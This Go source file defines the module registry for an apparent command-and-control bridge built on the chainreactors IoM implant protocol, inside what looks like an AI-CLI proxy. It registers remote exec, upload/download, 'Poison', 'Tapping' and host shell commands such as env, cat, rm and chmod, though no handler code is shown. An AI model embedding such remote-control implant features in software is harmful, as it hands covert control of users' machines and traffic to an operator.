package bridge

import (
	"fmt"
	"sync"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
)

// Module is the interface every bridge module must implement.
// Each module handles one type of C2 command (spite) received via SpiteStream.
type Module interface {
	// Name returns the module's spite name (e.g., "exec", "upload", "netstat").
	// This is the key used for dispatch and C2 registration.
	Name() string

	// Handle processes an incoming spite for the given session/task.
	Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite)
}

// ModuleContext provides modules with access to bridge capabilities without
// exposing the entire Bridge struct. It is constructed once per dispatch loop
// and passed to every module.Handle call.
type ModuleContext struct {
	ListenerID     string
	SendSpite      func(sessionID string, taskID uint32, spite *implantpb.Spite) error
	Tasks          *TaskManager
	TappingGet     func(sessionID string) (uint32, bool)
	TappingSet     func(sessionID string, taskID uint32)
	TappingDel     func(sessionID string)
	WaitForSession func(sessionID string, timeout time.Duration) *sessions.Session
}

// SendResponse is a convenience wrapper that builds a SpiteResponse and sends it.
func (ctx ModuleContext) SendResponse(sessionID string, taskID uint32, spite *implantpb.Spite) error {
	return ctx.SendSpite(sessionID, taskID, spite)
}

// SendFunc is the low-level sender signature matching spiteStream.Send.
type SendFunc func(resp *clientpb.SpiteResponse) error

// Registry holds all registered modules and provides dispatch and listing.
type Registry struct {
	mu      sync.RWMutex
	modules map[string]Module
	order   []string // insertion order for deterministic Names()
}

// NewRegistry creates an empty registry.
func NewRegistry() *Registry {
	return &Registry{
		modules: make(map[string]Module),
	}
}

// Register adds a module to the registry.
// Panics if a module with the same name is already registered (catches duplicate bugs at startup).
func (r *Registry) Register(m Module) {
	r.mu.Lock()
	defer r.mu.Unlock()

	name := m.Name()
	if _, exists := r.modules[name]; exists {
		panic(fmt.Sprintf("bridge: duplicate module registration: %q", name))
	}
	r.modules[name] = m
	r.order = append(r.order, name)
}

// Get returns the module for the given name, or nil.
func (r *Registry) Get(name string) Module {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.modules[name]
}

// Names returns all registered module names in registration order.
// This is used by onNewSession for the C2 Register call, replacing the hardcoded list.
func (r *Registry) Names() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]string, len(r.order))
	copy(out, r.order)
	return out
}

// Dispatch routes a spite to the correct module's Handle method.
// Returns true if a module was found, false otherwise.
func (r *Registry) Dispatch(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) bool {
	r.mu.RLock()
	m, ok := r.modules[spite.Name]
	r.mu.RUnlock()

	if !ok {
		return false
	}

	ctx.Tasks.Create(sessionID, taskID, m.Name())
	m.Handle(ctx, sessionID, taskID, spite)
	return true
}

// defaultModules returns the canonical list of all bridge modules.
// This is THE single source of truth for module registration.
// Adding a new module = adding one line here + implementing the Module interface.
func defaultModules() []Module {
	return []Module{
		// Core modules
		&ExecModule{},
		&PoisonModule{},
		&TappingModule{},
		&TappingOffModule{},
		&UploadModule{},
		&DownloadModule{},
		// Shell-based structured response modules
		NewShellModule(consts.ModuleNetstat, consts.ModuleNetstat, netstatCommand, netstatResponse),
		NewShellModule(consts.ModulePs, consts.ModulePs, psCommand, psResponse),
		NewShellModule(consts.ModuleLs, consts.ModuleLs, lsCommand, lsResponse),
		// Shell-based text response modules
		NewShellModule(consts.ModuleWhoami, "response", whoamiCommand, textResponse),
		NewShellModule(consts.ModulePwd, "response", pwdCommand, textResponse),
		NewShellModule(consts.ModuleCat, "response", catCommand, textResponse),
		NewShellModule(consts.ModuleEnv, "response", envCommand, envResponse),
		// Shell-based exec modules (no custom parser)
		NewShellModule(consts.ModuleKill, consts.ModuleExecute, killCommand, nil),
		NewShellModule(consts.ModuleMkdir, consts.ModuleExecute, mkdirCommand, nil),
		NewShellModule(consts.ModuleRm, consts.ModuleExecute, rmCommand, nil),
		NewShellModule(consts.ModuleCp, consts.ModuleExecute, cpCommand, nil),
		NewShellModule(consts.ModuleMv, consts.ModuleExecute, mvCommand, nil),
		NewShellModule(consts.ModuleCd, "response", cdCommand, textResponse),
		NewShellModule(consts.ModuleChmod, consts.ModuleExecute, chmodCommand, nil),
	}
}

// buildDefaultRegistry creates and populates a registry with all default modules.
func buildDefaultRegistry() *Registry {
	r := NewRegistry()
	for _, m := range defaultModules() {
		r.Register(m)
	}
	return r
}
